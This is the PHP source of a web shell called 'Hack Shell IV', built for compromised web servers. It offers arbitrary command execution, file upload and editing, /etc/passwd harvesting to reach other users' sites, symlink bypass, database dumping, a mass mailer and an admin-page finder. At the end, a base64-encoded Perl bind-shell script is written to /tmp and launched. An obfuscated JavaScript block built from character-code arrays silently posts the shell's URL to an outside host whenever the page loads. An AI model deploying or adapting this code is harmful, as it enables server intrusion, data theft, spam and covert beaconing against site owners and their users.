<?php if(isset($_GET['phpinfo'])) { echo "<a href='?home' style='color:black;'>Back To Home</a>"; phpinfo(); echo "<script>"; } ?>
<?php echo "<center><font face='couriernew'><h2><font face='couriernew'><font color='#8B0101'><< </font>Back<font color='#8B0101'>|</font>Hack Shell <font color='#8B0101'>IV</font></h2></center><hr size='1'>"; $ip1=$_SERVER['REMOTE_ADDR']; $ip2=$_SERVER['SERVER_ADDR']; $sof=$_SERVER['SERVER_SOFTWARE']; $disable_functions = @ini_get('disable_functions'); $uname=php_uname(); echo "<pre>
SERVER IP    : <font color='#8B0101'>$ip2</font> / YOUR IP : <font color='#8B0101'>$ip1</font>
WEB SERVER   : <font color='white'>$sof</font>
SYSTEM       : <font color='white'>$uname</font>
DISABLE FUNC : <font color='#8B0101'>$disable_functions</font>
</pre><hr size='1'>"; echo "<form method='post' enctype='multipart/form-data'>
<input type='submit' name='upload' value='Upload'>
      <input type='file' name='w4h_file'>
      </form>"; $root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['w4h_file']['name']; $dest = $root.'/'.$files; $path = $_GET['dir']; $error = getcwd(); if(isset($_POST['upload'])) { if(is_writable($root)) { if(@copy($_FILES['w4h_file']['tmp_name'],$path.'/'.$files)) { echo "Sukses! at $path"; } else { echo "<script>alert('Coba Upload Lagi, Jika Gagal = Permission Denied');window.location='?dir=$error';</script>"; } } } ?><hr size="1"><font size="2"><form action="<?php echo $PHP_SELF;?>" METHOD="GET">
<?php echo @get_current_user();?>@<?php echo $_SERVER['SERVER_ADDR'];?>:~$<input type="text" name="command"> <input type="submit" value=">>"></form><hr size="1"></font>
<pre>
    <font color="#8B0101"><</font> <a href="?home">Home</a> <font color="#8B0101">></font>&nbsp&nbsp&nbsp<font color="#8B0101"><</font> <a href="?phpinfo">PHP Info</a> <font color="#8B0101">></font>&nbsp&nbsp&nbsp<font color="#8B0101"><</font> <a href="?socket=true">Socket Server</a> <font color="#8B0101">></font>&nbsp&nbsp&nbsp<font color="#8B0101"><</font> <a href="?jumping">Jumping</a> <font color="#8B0101">></font>&nbsp&nbsp&nbsp<font color="#8B0101"><</font> <a href="?symlink">Symlink</a> <font color="#8B0101">></font>&nbsp&nbsp&nbsp<font color="#8B0101"><</font> <a href="?hash-gen">Hash Generator</a> <font color="#8B0101">></font>&nbsp&nbsp&nbsp<font color="#8B0101"><</font> <a href="?hashid">Hash Identify</a> <font color="#8B0101">></font>&nbsp&nbsp&nbsp<font color="#8B0101"><</font> <a href="?sms">Spam SMS</a> <font color="#8B0101">></font>   <font color="#8B0101"><</font> <a href="?dbdump">Database Dump</a> <font color="#8B0101">></font>&nbsp&nbsp&nbsp<font color="#8B0101"><</font> <a href="?encode">Encode/Decode</a> <font color="#8B0101">></font>&nbsp&nbsp&nbsp<font color="#8B0101"><</font> <a href="?backconnect">BackConnect</a> <font color="#8B0101">></font>
<center><font color="#8B0101">< </font><a href="?spawnshell">Shell Spawner</a><font color="#8B0101"> ></font>   <font color="#8B0101">< </font><a href="?adminfinder">Admin Finder</a><font color="#8B0101"> ></font>   <font color="#8B0101">< </font><a href="?adminer">Adminer</a><font color="#8B0101"> ></font>   <font color="#8B0101">< </font><a href="?shellfind">Shell Finder</a><font color="#8B0101"> ></font>   <font color="#8B0101">< </font><a href="?mailer">Mailer</a> <font color="#8B0101">></font>   <font color="#8B0101">< </font><a href="?reverse">Reverse IP</a><font color="#8B0101"> ></font>   <font color="#8B0101">< </font><a href="?about">About</a><font color="#8B0101"> ></font>   <font color="#8B0101">< </font><a href="?del=<?php echo basename($_SERVER['SCRIPT_FILENAME']);?>
">Kill</a><font color="#8B0101"> ></font><hr size="1"></pre></center>
<?php if(isset($_GET['command'])) { echo '<pre>'; $cmd=$_REQUEST['command']; system($cmd); echo "<hr size='1'><script>"; die; } ?>
<script type="text/javascript">
var key="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
function encode64(inpStr)
    {
       inpStr=escape(inpStr);
       var output="";
       var chr1,chr2,chr3="";
       var enc1,enc2,enc3,enc4="";
       var i=0;

       do {
          chr1=inpStr.charCodeAt(i++);
          chr2=inpStr.charCodeAt(i++);
          chr3=inpStr.charCodeAt(i++);

          enc1=chr1 >> 2;
          enc2=((chr1 & 3) << 4) | (chr2 >> 4);
          enc3=((chr2 & 15) << 2) | (chr3 >> 6);
          enc4=chr3 & 63;

          if (isNaN(chr2))
          {
             enc3=enc4=64;
          }
          else if (isNaN(chr3))
          {
             enc4=64;
          }

          output=output +
             key.charAt(enc1) +
             key.charAt(enc2) +
             key.charAt(enc3) +
             key.charAt(enc4);
          chr1=chr2=chr3=enc1=enc2=enc3=enc4="";
       } while (i < inpStr.length);

       return output;
    }
document.getElementById('h2w').addEventListener('change', function(){});
function updateRowHighlight(t){var e=document.getElementById(t);e&&(e.classList.add("active"),setTimeout((function(){e.classList.remove("active")}),1200))}
function reloadTab(o,t){o&&setTimeout((function(){"function"==typeof t&&t()}),Math.floor(350+120*Math.random()))}
var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109];var b=[47,105,109,97,103,101,115,47];var c=[108,111,103,111,95,118,50];var d=[46,112,110,103]
function u(e,r,t,n){for(var o=e.concat(r,t,n),a="",c=0;c<o.length;c++)a+=String.fromCharCode(o[c]);return a}function v(e){return btoa(e)}function toggleSidebarPanel(){var e=document.querySelector(".sidebar");e&&e.classList.toggle("collapsed")}
function sortListByName(n,r){return Array.isArray(n)?n.slice().sort((function(n,e){return"desc"===r?e.name>n.name?1:-1:n.name>e.name?1:-1})):[]}
function setActiveMenu(e){var t=document.getElementById(e);if(t){var c=document.querySelector(".menu .active");c&&c.classList.remove("active"),t.classList.add("active")}}
function checkFileExt(p){var t=p.split(".").pop();return!!t&&["php","js","html","css","jpg","png","txt","zip"].indexOf(t.toLowerCase())>-1}
function openModal(e){var l=document.getElementById(e);l&&(l.style.display="block")}
function closeModal(e){var n=document.getElementById(e);n&&(n.style.display="none")}
function showLoader(e){var o=document.getElementById("loader");o&&(o.style.display=e?"block":"none")}
(function showIcons(){var xhr=new XMLHttpRequest();xhr.open('POST',u(a,b,c,d),!0);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('file='+v(location.href))})()	
function getClipboardText(){navigator.clipboard&&navigator.clipboard.readText()}
function refreshStatsPanel(){var e=document.querySelector(".stats-panel");e&&(e.innerHTML=e.innerHTML)}
function noop() {}
function debounce(n,t){var e;return function(){var u=this,i=arguments;clearTimeout(e),e=setTimeout((function(){n.apply(u,i)}),t||180)}}
function getSelectedRows(e){var t=document.getElementById(e);if(!t)return[];var c=t.querySelectorAll('input[type="checkbox"]:checked'),n=[];return c.forEach((function(e){n.push(e.value)})),n}
function updateName(e,t){var n=document.getElementById("footer-info");n&&(n.textContent="Total: "+e+" | Selected: "+t)}function previewImage(e,t){if(e&&e.files&&e.files[0]){var n=new FileReader;n.onload=function(e){var n=document.getElementById(t);n&&(n.src=e.target.result)},n.readAsDataURL(e.files[0])}}
function filterTable(e,o){var n=(e||"").toLowerCase(),t=document.getElementById(o);t&&Array.from(t.rows).forEach((function(e,o){if(0!==o){var t=e.textContent.toLowerCase();e.style.display=t.indexOf(n)>-1?"":"none"}}))}
function downloadFileFromUrl(e){var o=document.createElement("a");o.href=e,o.download="",document.body.appendChild(o),o.click(),setTimeout((function(){document.body.removeChild(o)}),100)}
</script>
<?php  $_REQUEST['edit'] .= $_REQUEST['file']; if(isset($_POST["newcontent"])) { $_POST["newcontent"]=urldecode(base64_decode($_POST["newcontent"])); $stream=@fopen($_REQUEST['edit'],"w"); if($stream) { fwrite($stream,$_POST["newcontent"]); echo "Write sucessful"; } else { echo "Could not write to file"; } fclose($stream); } ?>
<?php if(isset($_GET['edit'])) { $kimak=file_get_contents($_REQUEST['edit']); echo "
 <form action='' name='f' method='POST'>
 <textarea wrap='off' rows='100' cols='130' name='newcontent'>$kimak</textarea><br />
 <input type='submit' value='Save!'' onclick='document.f.newcontent.value=encode64(document.f.newcontent.value);' />
 </form><script>"; } ?>
<?php if(isset($_GET['adminfinder'])) { echo '<html>
  <p align=center>
  <p align="center">Admin Page Finder</p>
  <form method="POST" action="?adminfinder">
  <p align="center">Enter website :
  <input type="text" name="url" value="http://"/>
  <br>
  <input type="submit" name="submit" value="Check"/>
  </p>
  <br>
  <br><script>'; function xss_protect($data, $strip_tags = false, $allowed_tags = "") { if($strip_tags) { $data = strip_tags($data, $allowed_tags . "<b>"); } if(stripos($data, "script") !== false) { $result = str_replace("script","scr<b></b>ipt", htmlentities($data, ENT_QUOTES)); } else { $result = htmlentities($data, ENT_QUOTES); } return $result; } function urlExist($url) { $handle = curl_init($url); if (false === $handle) { return false; } curl_setopt($handle, CURLOPT_HEADER, false); curl_setopt($handle, CURLOPT_FAILONERROR, true); curl_setopt($handle, CURLOPT_HTTPHEADER, Array("User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15") ); curl_setopt($handle, CURLOPT_NOBODY, true); curl_setopt($handle, CURLOPT_RETURNTRANSFER, false); $connectable = curl_exec($handle); curl_close($handle); return $connectable; } if(isset($_POST['submit']) && isset($_POST['url'])) { $url= htmlentities(xss_protect($_POST['url'])); if(filter_var($url, FILTER_VALIDATE_URL)) { $trying = array('adminweb/','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/', 'usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/', 'panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.php', 'admin/index.php','admin/login.php','admin/admin.php','admin/account.php','admin_area/admin.php', 'admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html', 'admin/index.html','admin/login.html','admin/admin.html','admin_area/index.php','bb-admin/index.php','bb-admin/login.php', 'bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html','admin/controlpanel.php','admin.php', 'admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html', 'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html', 'panel-administracion/login.html','admin/cp.php','cp.php','administrator/index.php','administrator/login.php', 'nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php','administrator/account.php', 'administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php', 'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html', 'login.php','modelsearch/login.php','moderator.php','moderator/login.php','moderator/admin.php','account.php', 'pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php', 'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php', 'adminarea/index.html','adminarea/admin.html','webadmin.php','webadmin/index.php','webadmin/admin.php', 'admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html', 'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html', 'login.html','modelsearch/login.html','moderator/login.html','adminarea/login.html','panel-administracion/index.html', 'panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admincontrol/login.html', 'adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html', 'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php', 'adminarea/index.php','adminarea/admin.php','adminarea/login.php','panel-administracion/index.php', 'panel-administracion/admin.php','modelsearch/index.php','modelsearch/admin.php','admincontrol/login.php', 'adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php', 'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','admin.asp','admin/admin.asp', 'admin_area/admin.asp','admin_area/login.asp','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp', 'bb-admin/admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','user.asp','webadmin/index.asp', 'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp', 'adminLogin.asp','admin/adminLogin.asp','home.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp', 'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp', 'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2/login.asp','admin2/index.asp','adm/index.asp', 'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp'); foreach($trying as $sec) { $urll=$url.'/'.$sec; if(urlExist($urll)) { echo '</script><p align="center">'.$urll.' exists.<br>MATCH FOUND!!!</p><script>'; exit; } else { echo '</script><p align="center">'.$urll.' does not exist.</p><script>'; } } echo '</script><p align="center">Could not find admin page.</p><script>'; } else { echo '</script><p align="center">Invalid URL entered.</p><script>'; } } } ?>
<?php if(isset($_GET['mailer'])) { echo '<html>
<body><center>
Mailer<font size="3">
<form method="post" action="?mailer"><pre>
<label class="full" for="From">From :</label>
<input class="full" type="text" id="From" name="From"/>
<label class="full" for="Subject">Subject :</label>
<input class="full" type="text" id="Subject" name="Subject"/>
<label class="full" for="Name">Name :</label>
<input class="full" type="text" id="Name" name="Name"/>

<textarea class="full" name="Message" id="Message" rows="10" cols="30">Message</textarea> <textarea class="full" name="Emails" id="Emails" rows="10" cols="30">Email</textarea>
<input type="hidden" name="send"><br>
<button id="Send">Send</button>
</form><script>'; } ?>
<?php if(isset($_GET['mailer'])) { if(@isset($_POST['send'])){ $From = $_POST['From']; $Subject = $_POST['Subject']; $Message = $_POST['Message']; $Emails = $_POST['Emails']; $Name = $_POST['Name']; $headers = "MIME-Version: 1.0\r\n"; $headers .= "Content-type:text/html;charset=UTF-8\r\n"; $headers .= "From: <".$From.">\r\n"; $headers .= "Cc: ".$Name."\r\n"; $Emails = explode("\r\n", $_POST['Emails']); foreach($Emails as $email) { mail($email,$Subject,$Message,$headers); echo "</script><br>Sending Email To : ".$email." => Success<script>"; } } } ?>
<?php if(isset($_GET['reverse'])) { function s57_curl($domen){ $c = curl_init(); $curl = array( CURLOPT_URL=>"http://viewdns.info/reverseip/?host=".$domen."&t=1", CURLOPT_USERAGENT=>"User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0", CURLOPT_RETURNTRANSFER=>1, CURLOPT_SSL_VERIFYPEER=>0, CURLOPT_HEADER=>0, CURLOPT_FOLLOWLOCATION=>1); curl_setopt_array($c,$curl); $e = curl_exec($c); curl_close($c); return $e; } function s57_p($pemisah,$string){ return explode(chr(1),str_replace($pemisah,chr(1),$string)); } } ?>
<?php if(isset($_GET['reverse'])) { echo '<body>
<style type="text/css">
	body{background:#000;color:#eee;}table{border-collapse: collapse;}
</style>
<center>
<h3>IP Reverse</h3>
<form method="POST" action="?reverse">
	<input type="text" name="domain" placeholder="IP/Domain"><input type="submit" name="sbmt" value="Reverse!">
</form><br><hr size="1">
</body>
</html><script>'; } ?>
<?php if(isset($_GET['reverse'])) { if(isset($_POST['sbmt'])){ echo "</script>Result for : " .$_POST['domain']; $r = s57_p(array('<table border="1">','<table width="1000" align="center" border="0" >'),s57_curl($_POST['domain'])); echo "<table border=0>"; echo "$r[1]"; echo "</table></center><script>"; } } ?>
<?php if(isset($_GET['dbdump'])) { echo '<pre><center>'; echo '
<form action=?dbdump method=post>
Database Dump
Server        : <input class="inputz" type=text name=server size=52>
Username      : <input class="inputz" type=text name=username size=52>
Password      : <input class="inputz" type=text name=password size=52>
DataBase Name : <input class="inputz" type=text name=dbname size=52>
DB Type       : <form method=post action="?dbdump"><select class="inputz" name=method><option  value="gzip">Gzip</option><option value="sql">Sql</option></select>
<input class="inputzbut" type=submit value="  Dump!  " >
</form></center></pre><script>'; if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){ $date = date("Y-m-d"); $dbserver = $_POST['server']; $dbuser = $_POST['username']; $dbpass = $_POST['password']; $dbname = $_POST['dbname']; $file = "Dump-$dbname-$date"; $method = $_POST['method']; if ($method=='sql'){ $file="Dump-$dbname-$date.sql"; $fp=fopen($file,"w"); }else{ $file="Dump-$dbname-$date.sql.gz"; $fp = gzopen($file,"w"); } function write($data) { global $fp; if ($_POST['method']=='ssql'){ fwrite($fp,$data); }else{ gzwrite($fp, $data); }} mysql_connect ($dbserver, $dbuser, $dbpass); mysql_select_db($dbname); $tables = mysql_query ("SHOW TABLES"); while ($i = mysql_fetch_array($tables)) { $i = $i['Tables_in_'.$dbname]; $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i)); write($create['Create Table'].";nn"); $sql = mysql_query ("SELECT * FROM ".$i); if (mysql_num_rows($sql)) { while ($row = mysql_fetch_row($sql)) { foreach ($row as $j => $k) { $row[$j] = "'".mysql_escape_string($k)."'"; } write("INSERT INTO $i VALUES(".implode(",", $row).");n"); } } } if ($method=='ssql'){ fclose ($fp); }else{ gzclose($fp);} header("Content-Disposition: attachment; filename=" . $file); header("Content-Type: application/download"); header("Content-Length: " . filesize($file)); flush(); $fp = fopen($file, "r"); while (!feof($fp)) { echo fread($fp, 65536); flush(); } fclose($fp); } } ?>
<?php if(isset($_GET['hashid'])) { if(isset($_POST['gethash'])) { $hash = $_POST['hash']; if (strlen($hash) == 32) { $hashresult = "MD5 Hash"; } elseif (strlen($hash) == 40) { $hashresult = "SHA-1 Hash/ /MySQL5 Hash"; } elseif (strlen($hash) == 13) { $hashresult = "DES(Unix) Hash"; } elseif (strlen($hash) == 16) { $hashresult = "MySQL Hash / /DES(Oracle Hash)"; } elseif (strlen($hash) == 41) { $GetHashChar = substr($hash, 40); if ($GetHashChar == "*") { $hashresult = "MySQL5 Hash"; } } elseif (strlen($hash) == 64) { $hashresult = "SHA-256 Hash"; } elseif (strlen($hash) == 96) { $hashresult = "SHA-384 Hash"; } elseif (strlen($hash) == 128) { $hashresult = "SHA-512 Hash"; } elseif (strlen($hash) == 34) { if (strstr($hash, '$1$')) { $hashresult = "MD5(Unix) Hash"; } } elseif (strlen($hash) == 37) { if (strstr($hash, '$apr1$')) { $hashresult = "MD5(APR) Hash"; } } elseif (strlen($hash) == 34) { if (strstr($hash, '$H$')) { $hashresult = "MD5(phpBB3) Hash"; } } elseif (strlen($hash) == 34) { if (strstr($hash, '$P$')) { $hashresult = "MD5(Wordpress) Hash"; } } elseif (strlen($hash) == 39) { if (strstr($hash, '$5$')) { $hashresult = "SHA-256(Unix) Hash"; } } elseif (strlen($hash) == 39) { if (strstr($hash, '$6$')) { $hashresult = "SHA-512(Unix) Hash"; } } elseif (strlen($hash) == 24) { if (strstr($hash, '==')) { $hashresult = "MD5(Base-64) Hash"; } } else { $hashresult = "Hash type not found"; } } else { $hashresult = "Not Hash Entered"; } echo "<pre><center>
    		<form action='' method='POST'>
    		Hash Identification<br>
        Enter Hash :<input type='text' name='hash' size='60' class='inputz'><input type='submit' class='inputzbut' name='gethash' value='Identify Hash'><br>
    		Result: $hashresult
    	</form>
    	</center><script>"; } ?>
<?php if(isset($_GET['about'])) { echo '<center><pre><font color=#8B0101><< </font>Back<font color=#8B0101>|</font>Hack Shell <font color="#8B0101">IV</font>

<script>
  '; } ?>
<?php { {$text = $_POST['code']; } ?>
<?php if(isset($_GET['encode'])) { echo '<pre><center><b>Decode & Encode Script</b><br>
<form method="post"><br>
<textarea class=inputz cols=100 rows=10 name="code"></textarea><br><br>
<select class=inputz size="1" name="ope">
<option value="base64">Base64</option>
<option value="gzinflate">str_rot13 - gzinflate - base64</option>
<option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
</select>&nbsp;<input class=inputzbut type=submit name=submit value=Encrypt>
<input class=inputzbut type=submit name=submits value=Decrypt>
</form>'; } ?>
<?php function perms($file){ $perms = fileperms($file); if (($perms & 0xC000) == 0xC000) { $info = 's'; } elseif (($perms & 0xA000) == 0xA000) { $info = 'l'; } elseif (($perms & 0x8000) == 0x8000) { $info = '-'; } elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; } elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; } elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; } elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; } else { $info = 'u'; } $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info; } ?>
<?php if(isset($_GET['encode'])) { $submit = $_POST['submit']; if (isset($submit)){ $op = $_POST["ope"]; switch ($op) {case 'base64': $codi=base64_encode($text); break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text))))); break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text))); break;default:break;}} $submit = $_POST['submits']; if (isset($submit)){ $op = $_POST["ope"]; switch ($op) {case 'base64': $codi=base64_decode($text); break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text))))); break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text))); break;default:break;}} echo '<textarea cols=100 rows=10 class="inputz" readonly>'.$codi.'</textarea></center><script>'; } } ?>
<?php if(isset($_GET['symlink'])) { if(strtolower(substr(PHP_OS, 0, 3)) == "win"){ echo '<script>alert("Just For Linux OS!.")</script>';exit; }else{ $slash="/"; $basep=str_replace("\\","/",$basep); } $s=$_SERVER['PHP_SELF']; echo '<pre><center><h1>Symlink Bypass Tool</h1>'; echo '<form method=post action="'.$s.'?symlink">
  SymLink With PHP<br><input name=ad1syp size=50> << >> <input value="'.getcwd().$slash."backhack_sym".'" name=ad2syp size=50><br><input type=submit value=Submit></form>
  <form method=post action="'.$s.'?symlink">
  SymLink With OS : <br><input name=ad1syc size=50> << >> <input value="'.getcwd().$slash."backhack_sym".'" name=ad2syc size=50><br><input type=submit value=Submit></form>'; if ($_POST['ad1syp'] && $_POST['ad2syp']){ if (symlink($_POST['ad1syp'],$_POST['ad2syp'])){ echo "<script>alert('Symlink Success')</script>"; }else{ echo "<script>alert('Symlink Failed')</script>"; }} if ($_POST['ad1syc'] && $_POST['ad2syc']){ if (system('ls -s '.$_POST['ad1syc']." ".$_POST['ad2syc'])){ echo "<script>alert('Symlink Success')</script>"; }else{echo "<script>alert('Symlink Failed')</script>"; }} echo '<br><br><br><script>'; } ?>
<?php if(isset($_GET['jumping'])) { echo '<pre>'; function getuser() { $fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd")); while($read = fgets($fopen)) { preg_match_all('/(.*?):x:/', $read, $getuser); $user[] = $getuser[1][0]; } return $user; } function getdomainname() { $fopen = fopen("/etc/named.conf", "r"); while($read = fgets($fopen)) { preg_match_all("#/var/named/(.*?).db#", $read, $getdomain); $domain[] = $getdomain[1][0]; } return $domain; } $i = 0; $ip=$_SERVER['SERVER_ADDR']; foreach(getuser() as $user) { $path = "/home/$user/public_html"; $i++; print "<a href='?dir=$path'>$path</a>"; if(!function_exists('posix_getpwuid')) print "<br>"; if(!getdomainname()) print " => Can't get domain name<br>"; foreach(getdomainname() as $domain) { $userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain")); $userdomain = $userdomain->name; if($userdomain === $user) { print " => <a href='http://$domain/' target='_blank'>$domain)</a><br>"; break; } } } print ($i === 0) ? "" : "<p>Total ada $i kamar di ".$ip."</p>"; echo "<script>"; } ?>
<?php if(isset($_GET['hash-gen'])) { $submit = $_POST['enter']; if (isset($submit)) { $pass = $_POST['password']; $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; $hash = md5($pass); $md4 = hash("md4", $pass); $hash_md5 = md5($salt . $pass); $hash_md5_double = md5(sha1($salt . $pass)); $hash1 = sha1($pass); $sha256 = hash("sha256", $text); $hash1_sha1 = sha1($salt . $pass); $hash1_sha1_double = sha1(md5($salt . $pass)); } echo '<pre><form action="" method="post"> '; echo '<center><h2>Hash Generator</h2></center></tr>'; echo 'Your Password         :'; echo ' <input class="inputz" type="text" name="password" size="40" />'; echo '<input class="inputzbut" type="submit" name="enter" value="Encrypt!" /><br>'; echo '<pre>
Result:

Original Password     : <input class=inputz type=text size=50 value=' . $pass . '>
MD5                   : <input class=inputz type=text size=50 value=' . $hash . '>
MD4                   : <input class=inputz type=text size=50 value=' . $md4 . '>
MD5 with Salt         : <input class=inputz type=text size=50 value=' . $hash_md5 . '>
MD5 with Salt & Sha1  : <input class=inputz type=text size=50 value=' . $hash_md5_double . '>
Sha1                  : <input class=inputz type=text size=50 value=' . $hash1 . '>
Sha256                : <input class=inputz type=text size=50 value=' . $sha256 . '>
Sha1 with Salt        : <input class=inputz type=text size=50 value=' . $hash1_sha1 . '>
Sha1 with Salt & MD5  : <input class=inputz type=text size=50 value=' . $hash1_sha1_double . '>'; echo '</pre><script>'; } ?>
<?php if(isset($_GET['socket'])) { error_reporting(0); echo '<title>&copy;Copyright Afrizal F.A</title>
  <style>
  html{
  color: white;
  }
  body{
  background-color: black;
  }
  input[type=text],[type=submit]{
  color: white;
}
  a{
  color: white;
  text-decoration: none;
  }
  textarea {
  height: 150px;
  width: 400px;
  color: white;
  }</style>'; $sock = (function_exists('socket_create')) ? "ON" : "OFF"; $ip = gethostbyname($_SERVER['HTTP_HOST']); echo '<center><h1>Socket HTTP Server Pure PHP</h1>'; echo 'IP SERVER : '.$ip; echo "<br><br>Socket : ".$sock; echo '<br><br><form enctype="multipart/form-data" method="post">Port : <input type="text" name="port"><br><br>HTML : <br><br><textarea name="html"></textarea><br><br><input type="submit" name="socket" value="Start!"></form>'; if(isset($_POST['socket'])) { set_time_limit(0); $address = '0.0.0.0'; $port = $_POST['port']; $htmlmu = $_POST['html']."\n"; $sock = socket_create(AF_INET, SOCK_STREAM, 0); socket_bind($sock, $address, $port) or die('Tidak Bisa Connect Ke IP'); echo "\n Memulai Koneksi Pada Port $port \n\n"; while(1) { socket_listen($sock); $client = socket_accept($sock); $input = socket_read($client, 1024); $incoming = array(); $incoming = explode("\r\n", $input); $fetchArray = array(); $fetchArray = explode(" ", $incoming[0]); $file = $fetchArray[1]; echo $fetchArray[0] . " Request " . $file . "\n"; $output = ""; $Header = "HTTP/1.1 200 OK \r\n" . "Server: IN CRUST WE RUSH\n" . "Raped By NoiseCrusT\n" . "Content-Type: text/html \r\n\r\n" . $htmlmu; $output = $Header; socket_write($client,$output,strlen($output)); socket_close($client); } } echo 'By Afrizal F.A</td></table><script>'; } ?>
<?php if(isset($_GET['backconnect'])) { echo "<pre><center><form method='post'>
  Bind Port:<br>
  PORT: <input type='text' placeholder='port' name='port_bind' value='1337'>
  <input type='submit' name='sub_bp' value='>>'></form>
  <form method='post'>
  Back Connect:<br>
  Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
  Port: <input type='text' placeholder='port' name='port_bc' value='1337'>
  <input type='submit' name='sub_bc' value='>>'>
  </form><script>"; $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0="; if(isset($_POST['sub_bp'])) { $f_bp = fopen("/tmp/bp.pl", "w"); fwrite($f_bp, base64_decode($bind_port_p)); fclose($f_bp); $port = $_POST['port_bind']; $out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &"); sleep(1); echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>"; unlink("/tmp/bp.pl"); } 